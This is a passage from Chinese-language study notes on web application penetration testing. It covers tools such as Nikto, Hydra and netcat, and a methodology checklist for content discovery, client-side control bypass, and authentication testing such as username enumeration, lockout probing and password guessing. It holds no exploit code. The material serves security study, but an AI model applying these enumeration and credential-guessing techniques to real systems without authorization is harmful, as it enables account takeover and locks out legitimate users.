<p>除非是对渗透测试不了解的用户，或者需要在短时间内处理大量的应用程序安全评估，不然一般不使用全自动的扫描。更好的做法是手动和自动的结合，通过手动在浏览器中访问目标 Web 应用程序，来指导扫描器的工作，这样好处多多，例如不容易遗漏关键的功能区域、避开危险功能、避开重复功能、处理可能遇到困难的输入确认、避免会话中断、正确处理多阶段的状态等；</p>
<h2 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h2><p>除了主流的渗透测试工具外，还有很多其他工具可以处理一些不常见的特殊任务，以下仅包含一些常用的，当遇到其他场景时，应该上网搜索并尝试更多更好的工具。</p>
<h3 id="Wikto-Nikto"><a href="#Wikto-Nikto" class="headerlink" title="Wikto/Nikto"></a>Wikto/Nikto</h3><p>Nikto 主要用来探查服务器上是否存在一些常见的第三方内容，它的工作原理很简单，就是先收集市面上各种普通使用的第三方内容，形成自己的数据库，然后基于该数据库，提出对应的请求，分析响应内容，从中找出关键特征，确认第三方内容是否存在；它的数据库会不断频繁的更新，以跟进最新的动态，因此比集成渗透工具要覆盖的多；</p>
<p>另外根据应用程序的自定义义行为，Nikto 允许对其分析功能进行配置，避免一些误警报；</p>
<blockquote>
<p>Wikto 是 Nikto 的 Windows 版本；</p>
</blockquote>
<h3 id="Firebug"><a href="#Firebug" class="headerlink" title="Firebug"></a>Firebug</h3><p>Firebug 是在浏览器中使用的工具，通过它可以任意的修改 HTML 页面上的标签内容和脚本（可能有点像油猴）；它主要用来分析和实现针对客户端的攻击，例如跨站点脚本、请求伪造、UI 伪装、跨域数据捕获攻击等；</p>
<h3 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h3><p>Hydra 是一个密码猜测工具，根据用户提供的用户名列表、URL 链接、线程数量等，它会生成大量的请求，然后根据响应判断密码是否猜测正确；</p>
<h3 id="定制脚本"><a href="#定制脚本" class="headerlink" title="定制脚本"></a>定制脚本</h3><p>一般情况下，使用通用工具，可以完成大多数的渗透测试任务。但在少数情况下，可能需要通过编写定制化的脚本，来解决特定的问题，常用场景如下：</p>
<ul>
<li>应用程序使用会话机制比较特别，例如：提交页面令牌有先后顺序要求；</li>
<li>某个漏洞，需要重复执行多个特定动作后，才会暴露出来；</li>
<li>会话终止后，需要通过非标准步骤重新建立会话；</li>
</ul>
<p>解决以上问题的办法，就是自己编写一段脚本来提示请求和处理响应，以完成特定的功能。有好的是，套件工具可能提供插件接口，可以将脚本集成到测试套件中（例如 Burp 的 Extender、WebScarab 的 Bean Shell）；</p>
<p>除了脚本本身可用的内置命令和第三方库以外，还可以调用操作系统 shell 中的工具，例如：</p>
<ul>
<li>Wget：通过 HTTP(S) 访问某个给定的 URL；它支持很多选项参数，例如：代理服务器、HTTP 验证等；</li>
<li>curl：用于提交 HTTP(S) 请求，同样支持很多选项参数，例如：不同的请求方法、请求参数、SSL 证书、HTTP 验证等；</li>
<li>netcat：主要用来处理与网络有关的任务，同样可以创建 TCP 连接，发送请求并处理响应；更有趣的是，它可以用来在本地创建一个监听器，接收来自其他计算机的连接请求（netcat 不支持 SSL 连接，但可以通过和其他工具配合使用来实现 SSL 连接）；</li>
<li>stunnel：它最核心的功能就是用来辅助建立 SSL 连接，即可以用在 netcat 上，也可以用在自定义脚本上；它的工作原理其实也不复杂，就是扮演代理服务器的作用，先监听某个本地端口，当收到发送到这个端口的请求后，再转成 SSL 转发请求到目标服务器；<img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210512081913.png" srcset="/img/loading.gif" lazyload></li>
</ul>
<h2 id="小结-12"><a href="#小结-12" class="headerlink" title="小结"></a>小结</h2><p>通过工具，可以极大的提高测试的效率。没有最好的工具，只有最合适的工具。</p>
<h1 id="21-渗透测试方法论"><a href="#21-渗透测试方法论" class="headerlink" title="21. 渗透测试方法论"></a>21. 渗透测试方法论</h1><p>通过抽象的方法论，能够更好的指导实践。渗透测试需要探查的区域可以总结如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210512082646.png" srcset="/img/loading.gif" lazyload></p>
<p>虽然从这张图看上去，各个攻击面之间好像有先后顺序，但其实并没有。完全可以利用在某个阶段发现有用的信息后，再返回上一个阶段重新进行攻击测试；例如通过访问控制漏洞，获得用户列表后，就可以基于该列表实施更加有针对性的密码猜测攻击；</p>
<p>在某个功能中发现的漏洞，对当前功能可能并没有什么危害，但是却可以被利用它进行其他功能的攻击。例如通过文件泄露漏洞获得源代码，然后可以直接进行代码审查，提高漏洞探查的效率；</p>
<p>某个漏洞的探查结果，可以帮助其他环节提高探查效率（因为很可能在程序内部，函数之间存在复用），例如同一个输入过滤程序，很可能使用在不同的功能模块中；当发现某种输入过滤的漏洞后，就有可能极大的提高其他环节的漏洞探查效率，设计有针对性的攻击荷载，直接避开过滤；</p>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>务必牢记的注意事项：</p>
<h3 id="转义-1"><a href="#转义-1" class="headerlink" title="转义"></a>转义</h3><p>部分字符在 HTTP 请求中，具有特殊的意义，而且出现在不同的位置时，可能意义不同；因为如果在请求中出现这些字符时，需要给它们进行 URL 编码，以确保它们能够被正确的识别和发送；</p>
<ul>
<li>&，用于在查询字符串和消息主体中分隔参数，字面量需要编码为 %26</li>
<li>=，用于在查询字符串和消息主体中连接参数键值对，字面量需要编码为 %3d</li>
<li>?， 用于在查询字符串中标记参数的起始位置，字面量需要编码为 %3f</li>
<li>空格，用于在请求的第一行标记 URL 结束，也用于在 Cookies 消息头中表示一个 cookie 值的结束；字面量需要编码为 %20 或者 +</li>
<li>+，表示空格，字面量需要编码为 %2b</li>
<li>;，用于在 cookie 消息头中分隔多个 cookie 值，字面量需要编码为 %3b</li>
<li>#，用于在 URL 中标记片段名称的起始位置，如果在 URL 中插入这个字符，URL 将被截短为插入位置前面的部分，后面的部分转换成片段标识；字面量需要编码为 %23</li>
<li>%，用于标记 URL 编码的起始位置，字面量需要编码为 %25</li>
<li>空字节，字面量需要编码为 %00</li>
<li>换行符，字面量需要编码为 %0a</li>
</ul>
<h3 id="二次转义"><a href="#二次转义" class="headerlink" title="二次转义"></a>二次转义</h3><p>浏览器通常会对表单中提交的数据进行 URL 编码，因为如果在表单中输入已经编码过的值，则很可能会导致二次编码，最好在拦截代理服务器中查看核定一下最终结果；</p>
<h3 id="假阳性"><a href="#假阳性" class="headerlink" title="假阳性"></a>假阳性</h3><p>有时候良性请求，也会导致响应中出现漏洞特征，导致扫描器误以为存在漏洞。此时需要分别提交良性和攻击两种请求，看响应是否有所区别，以确定漏洞真实存在，而不是误报（假阳性）；</p>
<h3 id="隔离"><a href="#隔离" class="headerlink" title="隔离"></a>隔离</h3><p>扫描器通常会对某个接口发送多个请求，导致它出现了多种状态。它下一个请求可能需要在某个特定的状态下，才能继续，因此上一个请求的多种状态，会导致下一个请求无法正常进行。解决办法是可以换个浏览器建立新会话，提交良性请求导致到目标位置，提交攻击请求，然后观察是否出现异常的响应；当然，如果不想另开浏览器，也可以通过修改 cookie 值和缓存信息进行调整；或者，也可以使用 Burp Reapter 工具隔离请求，让每个请求的状态不会相互影响</p>
<h3 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h3><p>有些应用程序很可能使用负载均衡，后端可能存在不止一台服务器，因此某个攻击请求造成的影响，可能仅限于某台服务器；当下一个验证请求恰好没有到达该服务器时，可能会误以为攻击没有成功；解决办法是多次提交验证请求，直到请求被转发到目标服务器，验证攻击是否成功；</p>
<h2 id="解析应用程序内容"><a href="#解析应用程序内容" class="headerlink" title="解析应用程序内容"></a>解析应用程序内容</h2><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210513074745.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="搜索可见的内容"><a href="#搜索可见的内容" class="headerlink" title="搜索可见的内容"></a>搜索可见的内容</h3><ul>
<li>配置浏览器，使用代理服务器或爬虫工具，例如使用 Burp 和 WebScarab 监控并被动抓取代理服务器拦截的内容；</li>
<li>如果需要，除了从代理服务器入手外，也可以从浏览器入手；可以考虑安装浏览器扩展，例如 IEWatch，监控分析浏览器处理的 HTTP 和 HTML 内容；</li>
<li>以常规的方式，浏览整个应用程序，包括发现的每一个链接、提交每一个表单、完成多阶段功能；同时尝试在禁用 javascript 或 cookie 的状态下进行浏览；原因：针对不同内容和不同的浏览器设置，应用程序内部可能有相应的处理逻辑；</li>
<li>如果可以创建或者拥有登录账户，则访问所有被保护的功能；</li>
<li>在浏览过程中，留意客户端的代码如何对服务端返回的内容进行处理；</li>
<li>查看自动生成的站点地图，看是否包含未被手动浏览访问的链接或功能；例如可以使用 Burp Spider 中的 Linked From 功能，了解每项内容是从何处链接过来的；然后访问这些来源链接，向上追溯，以期找到更多的内容；反复递归使用这个方法，直到无法发现任何新内容；</li>
<li>手动浏览结束后，可进一步选择部分 URL 做为起点，使用爬虫进行自动抓取。这种方法有时会找到一些漏网之鱼；不过在进行自动抓取前，需要先创建可引起会话中断的链接列表，配置爬虫，避开这些链接；</li>
</ul>
<h3 id="浏览公开内容"><a href="#浏览公开内容" class="headerlink" title="浏览公开内容"></a>浏览公开内容</h3><ul>
<li>网站的公开内容很可能会被搜索引擎的爬虫抓取过，因此，可以使用搜索引擎和档案库（如 Waybak Machine）来查找与目标应用程序相关的内容；</li>
<li>注意使用搜索引擎的参数来提高搜索效率，例如在 google 中：<ul>
<li>site，用来指定搜索的目标站点；</li>
<li>link，获取链接到目标站点的其他站点；</li>
</ul>
</li>
<li>在搜索引擎中发现的内容有时可能已被目标程序删除，但通过查看页面缓存，有时可以在里面发现一些有效的资源链接；</li>
<li>搜索在应用程序的内容中出现的任何姓名和电邮地址；这些内容有时候可能不在屏幕上显示，而是隐藏在注释中；</li>
<li>除了 Web 搜索外，还应进行新闻和小组讨论搜索， 因为有时候新闻内容可能包括与应用程序有关的技术信息；</li>
<li>检查任何已发布的接口文档，以了解应用程序可能采用的功能名称和参数说明；</li>
</ul>
<h3 id="发现隐藏的内容-1"><a href="#发现隐藏的内容-1" class="headerlink" title="发现隐藏的内容"></a>发现隐藏的内容</h3><ul>
<li>先找到应用程序响应无效资源的规律，以便将这个规律用于枚举过程中的筛查；获取规律的办法：先手动向已知有效和已知无效的资源发起请求，比对返回的响应，看看应用程序在响应有效和无效资源时，有什么特征；</li>
<li>准备一份常见文件名、文件扩展名和常见目录的列表；</li>
<li>了解应用程序开发者的命名方案，以便猜测余下的资源名称；例如某个资源命名为 AddDocument 和 ViewDocument，那很可能存在 EditDocument 和 RemoveDocument 等资源；</li>
<li>查看客户端代码，从中发现与服务端内容有关的线索，HTML 注释和禁用的表单元素也需查看；</li>
<li>结合已知的资源名和目录名，再加第2步准备好的列表，向应用程序发送大量请求，根据第1步的特征筛查响应，以找出任何可访问的隐藏内容；</li>
<li>以上一步找到的内容为基础，再次使用爬虫，对它们进行手动和自动两方面的抓取；</li>
</ul>
<h3 id="查找第三方内容"><a href="#查找第三方内容" class="headerlink" title="查找第三方内容"></a>查找第三方内容</h3><ul>
<li>使用 Nikto，探查服务端可能使用的任何第三方组件；注意设置 Nikto 的选项以提供探查的效率，例如使用 --root 选项可在指定目录中进行查找；或者使用 -404 选项指定一个字符串，对应用程序自定义的 Not Fount 页面进行标识；</li>
<li>手动核查结果，以找出其中可能有用的信息，避免出现漏网之鱼；</li>
<li>在 Host 消息头中指定 IP  地址，访问应用程序在服务器上的根目录。查看应用程序是否会返回不一样的响应；如果会的话，针对该 IP 地址进行 Nikto 扫描；</li>
<li>请求根目录时，分别设置不同的 User-Agent 值，看服务端是否会返回不同的内容；</li>
</ul>
<h3 id="枚举标识符函数"><a href="#枚举标识符函数" class="headerlink" title="枚举标识符函数"></a>枚举标识符函数</h3><p>有些应用程序会在请求参数中携带要执行的函数名称，例如：/admin.jsp/action=editUser 或 /main.php?func=A21，很有意思；</p>
<ul>
<li>确定任何在请求参数中提交函数名称的链接；</li>
<li>分析它的命名规律，同时找出猜测失败时的响应特征；</li>
<li>准备一份常用的函数名称列表，发送大量枚举请求；</li>
<li>一般来说，应用程序的内容地图是基于 URL 路径来绘制的，但有时可换个思路，尝试基于函数名称，来编写内容地图；先通过枚举找出所有功能路径，然后为它们建立逻辑关系（详见第4章示例）；</li>
</ul>
<h3 id="调试参数"><a href="#调试参数" class="headerlink" title="调试参数"></a>调试参数</h3><p>有些应用程序会在 URL 中携带调试参数，以开启调试功能；</p>
<ul>
<li>选择一个或多个可能使用调试参数的 URL，一般最有可能出现在登录、搜索、文件上传或下载的功能中；</li>
<li>枚举常见的调试参数名称（如 debug、test、hide、source 等）与常用的参数值（如 true、yes、on、1 等）；枚举所有键值对组合，向应用程序发送大量请求（据说 Burp 有个“集束炸弹”功能可以帮忙生成组合）；</li>
<li>分析响应，看是否与非调试状态的响应有所区别；</li>
</ul>
<h2 id="分析应用程序-1"><a href="#分析应用程序-1" class="headerlink" title="分析应用程序"></a>分析应用程序</h2><h3 id="确定功能"><a href="#确定功能" class="headerlink" title="确定功能"></a>确定功能</h3><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210514075045.png" srcset="/img/loading.gif" lazyload></p>
<ul>
<li>了解为了让应用程序正常运行，需要建立的核心功能，以及每项功能需要涉及的操作；</li>
<li>了解应用程序使用的核心安全机制，以及这些安全机制的工作原理（重点可放在身份验证、会话管理、访问控制等关键的几个机制，以及它们的辅助功能如用户注册、忘记密码等）；</li>
<li>了解外围功能，如错误消息、管理功能、日志功能、站外链接、重定向的使用位置等；</li>
<li>找出任何与应用程序通用样式不一致的界面、参数命名或导航，将它们挑出来进行深入的测试（这些位置很可能使用第三方的组件）；</li>
</ul>
<h3 id="确定数据进入点"><a href="#确定数据进入点" class="headerlink" title="确定数据进入点"></a>确定数据进入点</h3><ul>
<li>确定应用程序中所有引入用户输入的位置，包括 URL、查询字符串参数、POST 数据、cookie、消息头等；</li>
<li>了解应用程序使用的所有自定义的数据传输或者数据编码方法，例如自定义的查询字符串格式、被提交数据是否使用键值对或者其他表示方法；</li>
<li>了解所有在应用程序中引入的用户可控制的，或者第三方控制的带外通道，例如显示和处理 SMTP 邮件；</li>
</ul>
<h3 id="确定所使用的技术"><a href="#确定所使用的技术" class="headerlink" title="确定所使用的技术"></a>确定所使用的技术</h3><ul>
<li>找出客户端代码所使用的技术，例如表单、JS脚本、cookie、Java Applet、ActiveX 控件、Flash 对象等；</li>
<li>尽可能确定服务端所使用的技术，包括使用何种语言、框架、与数据库和电子邮件交互的组件等；</li>
<li>检查响应中的 Server 消息头，或者其他 HTTP 消息头、HTML 源代码注释中可能出现的标识符，通过标识符判断服务端所使用的服务器软件；有时，应用程序的不同功能可能使用不同的后端组件进行处理，因为可能会找到多种不同的标识符；</li>
<li>使用 Httprint 工具，分析 Web 服务器指纹；</li>
<li>检查上一步内容解析过程收集的信息，找出有助于了解服务端使用何种技术的关键信息，例如文件扩展名、目录、URL 序列等；检查会话令牌和 cookie 名称，并通过 google 搜索这些名称背后所使用的技术；</li>
<li>找出那些看起来有点意思的脚本名称和查询参数，因为它们可能属于第三方组件；使用 inurl 选项通过 google 搜索相关内容，找出同样使用这些第三方组件的其他站点。对这些站点实施非侵入审查，有可能会发现一些在目标应用程序中隐藏的功能和内容；</li>
</ul>
<h3 id="解析受攻击面-1"><a href="#解析受攻击面-1" class="headerlink" title="解析受攻击面"></a>解析受攻击面</h3><ul>
<li>了解和推测服务端的应用程序内部结构和功能，以及为实现某些客户端功能的后台工作机制，例如查询订单的功能，大概率需要跟数据库发生交互；</li>
<li>罗列好功能后，再思考每一种功能背后可能发生的漏洞，例如文件上传功能可能存在路径遍历漏洞、用户间通信可能存在 XSS 漏洞、联系客服功能可能存在 SMTP 注入漏洞等；</li>
<li>制定攻击优先级计划，优先攻击最有用的功能以及与之相关的最严重的潜在漏洞；</li>
</ul>
<h2 id="测试客户端控件"><a href="#测试客户端控件" class="headerlink" title="测试客户端控件"></a>测试客户端控件</h2><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210514082819.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="客户端数据传送机制"><a href="#客户端数据传送机制" class="headerlink" title="客户端数据传送机制"></a>客户端数据传送机制</h3><ul>
<li>找出所有在客户端传送数据的场景，包括但不限于隐藏的表单字段、cookie、URL 参数等；</li>
<li>根据所传送数据的名称、值和出现的位置，猜测它们在服务端应用程序逻辑中的用途；</li>
<li>尝试修改数据的值，看是否会对服务端的应用程序产生影响，包括了解应用程序是否接受任意值，还是会进行过滤；以及是否会干扰应用程序的逻辑，是否会触发或破坏一些安全机制；</li>
<li>如果客户端传送模糊数据，可尝试破译模糊算法，以便在模糊数据中写入任意指定值；以及可尝试不修改数据，而是在不同场景中提交相同的模糊数据，看是否会干扰应用程序的逻辑；</li>
<li>如何应用程序在客户端使用 ASP.NET ViewState，对其进行测试。看是否可以破坏它，或者查看其中是否包括敏感数据（不同页面，使用 ViewStatue 的方式可能有所不同）<ul>
<li>使用 Burp 套件中的 ViewState 分析器，看 EnableViewStateMac 选项是否开启，如果开启的话，则数据不可修改，因为服务端将校验客户端提交的内容是否与发出时一致，如果修改，会触发错误；</li>
<li>查看解码后的 ViewState，看是否包含敏感数据；</li>
<li>尝试一个被解码的参数值，再重新编码，存入 ViewState；如果服务器接受修改后的 ViewState，则说明 ViewState 可被用于提交任意的输入。因此，可对其包含的数据进行和普通参数一样的测试；</li>
</ul>
</li>
</ul>
<h3 id="客户端输入控件"><a href="#客户端输入控件" class="headerlink" title="客户端输入控件"></a>客户端输入控件</h3><ul>
<li>找出所有客户端对输入进行限制的场景，了解其限制规则；</li>
<li>违法这些规则提交输入，轮流测试每一个参数，看服务端是否使用相同的输入确认；</li>
<li>检查所有的 HTML 表单，找出禁用的元素，如禁用的灰色按钮；并尝试与其他表单一起提交，看应用程序如何处理。如果发生异常行为的，思考是否可以在攻击过程中利用这种异常行为（代理服务器可以通过配置规则，自动启用禁用的字段，提高攻击效率，例如 Burp 套件中的 "HTML修改" 选项）</li>
</ul>
<h3 id="测试浏览器扩展组件"><a href="#测试浏览器扩展组件" class="headerlink" title="测试浏览器扩展组件"></a>测试浏览器扩展组件</h3><h4 id="了解组件功能"><a href="#了解组件功能" class="headerlink" title="了解组件功能"></a>了解组件功能</h4><ul>
<li>通过代理服务器拦截客户端和服务端之间的流量，监控其数据（如果数据被序列化，则可以使用套件的工具对其反序列化）；</li>
<li>有了数据后，查看在客户端中呈现出来的功能，从而了解这些数据被如何使用和呈现，能够为用户带来什么功能价值；必要时，可以重复发送关键请求，或者修改服务端返回的响应，了解功能如何实现；</li>
</ul>
<h4 id="反编译组件"><a href="#反编译组件" class="headerlink" title="反编译组件"></a>反编译组件</h4><p>有些应用程序会使用一些厚客户端组件，例如 Java 的 applet</p>
<ul>
<li>通过拦截代理服务器查找特定的文件类型，另外还可以在 HTML 源代码中进行查找，例如 applet 标签等；<ul>
<li>.class 或 .jar 文件：使用 Java</li>
<li>.swf 文件：Flash</li>
<li>.xap 文件：Silverlight</li>
</ul>
</li>
<li>找出所有调用 applet 的地方，并确定 applet 返回的数据，是否被提交到服务端；applet 返回的数据有时可能会经过模糊处理，此时不能直接修改它，因为直接修改会被服务端发现和拒绝，导致数据无效；需要先反编译 applet，得到其源代码，之后才能对数据进行修改；</li>
<li>在浏览器输入 URL，下载 applet 字节码，使用适当的工具对其进行反编译（有时下载的文件可能被压缩过，可使用解压工具进行解压，例如 WinRAR 或 WinZip）；<ul>
<li>Java 的 applet：可使用 Jad</li>
<li>Flash：SWFScan、Flasm、Flare；</li>
<li>Silverlight：.NET Reflector；</li>
</ul>
</li>
<li>分析反编译后的源代码，了解其返回的数据是如何处理和计算出来的；</li>
<li>查看源代码中，是否包含对任意数据进行模糊处理的通用函数；</li>
<li>如果源代码中有对输入进行检查，可对其进行修改，让检查失效；</li>
<li>修改后，再使用编译工具，将源代码重新编译为原本的格式；</li>
</ul>
<h4 id="附加调试器-1"><a href="#附加调试器-1" class="headerlink" title="附加调试器"></a>附加调试器</h4><p>如果客户端程序很大，反编译、阅读和修改其源代码的工作量很大，而且也很容易出错，一个抄小路的办法是使用调试器，追踪某个功能的执行过程，理解其处理逻辑，然后在合适的位置设置断点，修改相应的值，得到我们想要的最终预期结果即可。</p>
<ul>
<li>JavaSnoop；</li>
<li>Silverlight Spy；</li>
</ul>
<h4 id="测试-ActiveX-控件"><a href="#测试-ActiveX-控件" class="headerlink" title="测试 ActiveX 控件"></a>测试 ActiveX 控件</h4><ul>
<li>找出所有使用 ActiveX 控件的地方。可从拦截的请求记录中查找 .cab 文件名，或者在 HTML 页面源代码中搜索 OBJECT 标签</li>
<li>同样可以使用调试器来修改和操纵 ActiveX 控件的返回值；</li>
<li>可使用 COMRaider 等工具枚举控件的各种方法。根据 ActiveX 控件的方法名称和参数，猜测其用途。检查是否能够操作这些方法，从而影响控件的行为，例如避开执行的输入确认机制；</li>
<li>如果控件的功能是收集检查客户端计算机的相关信息，则可以使用第三方工具（如 Filemon、Regmon 等）监控控件收集到的信息；然后通过修改客户端注册表中的值，或者创建相应的数据项，来影响控件的行为；</li>
<li>探查控件是否存在可用来攻击其他用户的漏洞；可修改 HTML 调用控件的源代码，修改参数，监控控件的处理结果；</li>
<li>查找控件有无存在危险的方法，例如搜索 LaunchExe 名称；</li>
<li>使用 COMRaider 对控件进行模糊测试，看是否存在缓冲区溢出漏洞；</li>
</ul>
<h2 id="测试验证机制"><a href="#测试验证机制" class="headerlink" title="测试验证机制"></a>测试验证机制</h2><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210515083421.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="了解验证机制"><a href="#了解验证机制" class="headerlink" title="了解验证机制"></a>了解验证机制</h3><ul>
<li>了解应用程序使用的验证机制，如用户名密码表单、证书、多重验证；</li>
<li>了解所有与验证相关的功能，如登录、注册、忘记密码等；</li>
<li>如果应用程序不能自助注册，则尝试通过其他方法搞到几个账户；</li>
</ul>
<h3 id="测试密码强度"><a href="#测试密码强度" class="headerlink" title="测试密码强度"></a>测试密码强度</h3><ul>
<li>寻找应用程序中关于密码强度的最低要求；</li>
<li>在注册页面或密码修改页面，使用不同强度的密码，对实际的密码强度规则进行测试，例如短密码、纯数字密码、全小写或全大写密码、单词型密码、和用户名一致的密码等；</li>
<li>测试服务端密码验证机制：例如先设置一个足够长（如12个字符）且复杂的密码（包含大小写、数字和特殊符号），然后尝试使用这个密码的各种变化形式进行登录（例如删除最后一个字符、改变大小写、删除特殊字符等）；如果某种尝试取得成功，不要停下来，继续测，直到摸清服务端的整个密码验证机制；</li>
<li>了解清楚最低密码强度要求，以及服务端的密码验证机制后，使用这些信息来枚举可能有效的密码值，以提高攻击成功概率；</li>
<li>尝试枚举可能存在的内置账户，它们很可能并不满足最低密码强度要求；</li>
</ul>
<h3 id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a>用户名枚举</h3><ul>
<li>找出所有提交用户名的位置，例如可见字段、隐藏字段、cookie 等；（这些位置通常为登录、注册、修改密码、退出账户、激活账户等）；</li>
<li>在每一个提交用户名的位置，故意先提交一个有效用户名的请求，然后再提交一个无效用户名的请求，比如这两个请求之间的差异，以便后续用于筛查枚举出的有效用户名（这些差异可能发生在可见的 HTML 内容、状态码、不可见的 HTML 源代码中，有时则可从服务端的响应时间做出判断）；可以使用一些第三方工具（如  WebScarab）对返回的 HTML 内容进行自动比对，快速找出差异）；</li>
<li>当找到差异后，再提交一组或多组有效+无效的用户名进行重复测试，然后从差异中寻找规律；</li>
<li>尝试通过应用程序其他方面的漏洞（例如信息泄露、日志、注册用户列表、源代码注释等），获取尽可能多的有效用户名；</li>
<li>分析是否有可能利用一些使用用户名参数的功能，对有效用户名进行枚举，例如注册功能，当尝试输入一个已经存在的用户名时，会有提示；</li>
</ul>
<h3 id="失败次数上限"><a href="#失败次数上限" class="headerlink" title="失败次数上限"></a>失败次数上限</h3><ul>
<li>找出所有提交密码的位置（通常为注册页面、修改密码页面）；如果修改密码页面能够提交任意用户名，则该功能有可能用于猜测密码；</li>
<li>在每一个位置，先提交多组正确的用户名（受控账户）+ 错误密码的请求，监控应用程序的响应，找出响应之间的差异（如果经过10次登录失败后，账户还没有锁定，则可以再提交一个包含有效密码的请求，看是否能够顺利登录，如果可以的话，说明应用程序很可能并没有设置失败次数上限的账户锁定机制）；</li>
<li>如果没有受控账户，则只能通过枚举或猜测一个有效的用户名，然后使用这个用户名进行测试，看超过一定的失败次数后，是否会导致账户锁定（这个方法的缺点是会导致一些用户的账户被冻结锁定）</li>
</ul>
<h3 id="测试忘记密码功能"><a href="#测试忘记密码功能" class="headerlink" title="测试忘记密码功能"></a>测试忘记密码功能</h3><ul>
<li>确定应用程序是否有忘记密码的功能（正常都有）；</li>
<li>使用一个正常的受控账户，完整整个忘记密码的流程，了解其工作机制（有些是发邮件，有些是询问问题、有些是发短信等）；</li>
<li>如果机制是询问答题，则确定这些问题是否由用户在注册时设定或选择的；如果是的话，可使用多个受控账户来收集这些问题，看里面是否有部分问题的答案较容易枚举猜测出来；</li>
<li>如果机制是密码暗示，使用跟上一步相同的步骤，收集密码暗示，看是否有容易猜到答案的暗示；</li>
<li>使用一个受控账户 + 多个错误答案进行测试，看是否会触发账户冻结；如果不会，则意味着可以使用枚举攻击；</li>
<li>如果机制是发送邮件，则使用受控账户接收多个邮件，分析邮件中收到的账户恢复 URL 是否存在规律，能否利用它猜测出发给其他用户的 URL；同时，确认是否有可能控制收件地址；</li>
</ul>
<h3 id="测试“记住我”功能"><a href="#测试“记住我”功能" class="headerlink" title="测试“记住我”功能"></a>测试“记住我”功能</h3><ul>
<li>确定应用程序是否有“记住我”的功能，如果有的话，激活它，并分析它的工作原理；</li>
<li>有些“记住我”的功能可让用户再次登录时不需要输入密码，分析其工作原理；</li>
<li>检查该功能是否使用本地存储的 cookie，如果有的话，分析 cookie 是否包含用户的身份信息；</li>
<li>通常 cookie 会经过模糊处理，但可以通过多个非常相似的用户名，来分析模糊处理是否存在规律，如果有的话，就有机会进行逆向工程；</li>
<li>根据找到的规律，尝试修改 cookie 内容，看是否能够伪装成其他用户登录；</li>
</ul>
<h3 id="测试伪装功能"><a href="#测试伪装功能" class="headerlink" title="测试伪装功能"></a>测试伪装功能</h3><ul>
<li>查找应用程序中是否存在伪装漏洞，即 A 用户可伪装成 B 用户并查看其数据；</li>
<li>从用户提交的数据中，查找是否有哪项数据可用于伪装身份，尝试修改这个数据，看能否伪装成其他用户，尤其是能够提升权限的管理员账户；</li>
<li>在实施密码猜测攻击的过程中，特别留意是否以下现象，即一个账户对应多个密码，或者多个密码对应相同账户；这个现象意味着开发人员很可能设置有后门密码，运营人员利用该后门密码可登录任意用户的账号；</li>
</ul>
<h3 id="测试用户名唯一性"><a href="#测试用户名唯一性" class="headerlink" title="测试用户名唯一性"></a>测试用户名唯一性</h3><ul>
<li>如果应用程序提交自助注册的功能，并允许用户填写自己想要的用户名，则可以尝试使用不同的密码注册相同用户名，看应用程序是否会报错，如果会的话，有可能可以利用该报错功能，来枚举有效的用户名；</li>
<li>注册相同用户名时，如果应用程序没有报错，就有意思了。此时可将 A 账号的密码，修改成与 B 账号一样，然后进行登录，观察应用程序的反应；之后，再尝试使用相同的账号和密码进行注册，观察应用程序的反应；（有些应用程序，可能使用账号+密码的组合，作为用户身份的标识）；</li>
<li>如果两个账号的用户名和密码发生冲突时，应用程序会报错，则可以利用该功能来猜测其他用户的密码；先枚举有效的用户名，再枚举密码进行注册。当某个组合出现报错时，则说明该用户名 + 密码可能已经被注册过了；</li>
<li>如果两个冲突的账号+密码也不会报错，则进行登录，看两个账号的身份是否会互窜，使得 A 账号可以访问 B 账号的数据；</li>
</ul>
<h3 id="测试密码可预测性"><a href="#测试密码可预测性" class="headerlink" title="测试密码可预测性"></a>测试密码可预测性</h3><ul>
<li>如果用户名和密码是由应用程序自动生成的，则找出名称上相连的账号和它们的密码，观察这些密码之间存在规律；</li>
<li>如果用户名的生成是有规律的，则往后推，枚举一组很可能有效的用户名，使用这些用户名来猜测密码；</li>
<li>如果密码的生成是有规律的，则可以使用该规律往前推，枚举可能有效的密码，然后和已经收集的有效用户名进行组合，实施猜测攻击；</li>
</ul>
<h3 id="检测不安全的密码传输"><a href="#检测不安全的密码传输" class="headerlink" title="检测不安全的密码传输"></a>检测不安全的密码传输</h3><ul>
<li>遍历所有需要传输密码的位置，例如注册、登录、密码修改、查看和更新个人信息等功能；</li>
<li>配置代理服务器的拦截功能，对特殊字符进行标记，以便让拦截器找出在哪些位置传输密码；</li>
<li>如果在 URL 参数中传输，则密码很可能会在浏览器历史记录、屏幕、服务器日志，以及 Referer 消息头（当访问第三方链接时）中泄露；</li>
<li>如果密码保存在 cookie 中，则可通过 XSS 攻击或本地隐私攻击获得；</li>
<li>如果密码从服务端传送回客户端，则攻击者有可能通过会话管理漏洞、访问控制漏洞、XSS 漏洞等方式获得证书；</li>
<li>如果密码在传输过程中没有加密，则可能被传输过程中的窃听者获取；</li>
<li>如果使用 HTTPS 传输，但是使用 HTTP 加载表单，则存在中间人攻击漏洞，攻击者可以利用该漏洞获得密码；</li>
</ul>
<h3 id="检测不安全的密码分配"><a href="#检测不安全的密码分配" class="headerlink" title="检测不安全的密码分配"></a>检测不安全的密码分配</h3><ul>
<li>有些应用程序可能使用某种第三方渠道来创建账号或分配初始密码，例如通过发送电子邮件，或者寄送信件等；</li>
<li>如果应用程序使用 URL 来激活账号，则可以尝试连续注册几个账号，然后分析收到的 URL，看是否存在生成规律；</li>
<li>如果有规律，尝试预测应用程序最近生成的 URL，尝试使用这些 URL 来激活最近注册的用户账号；</li>
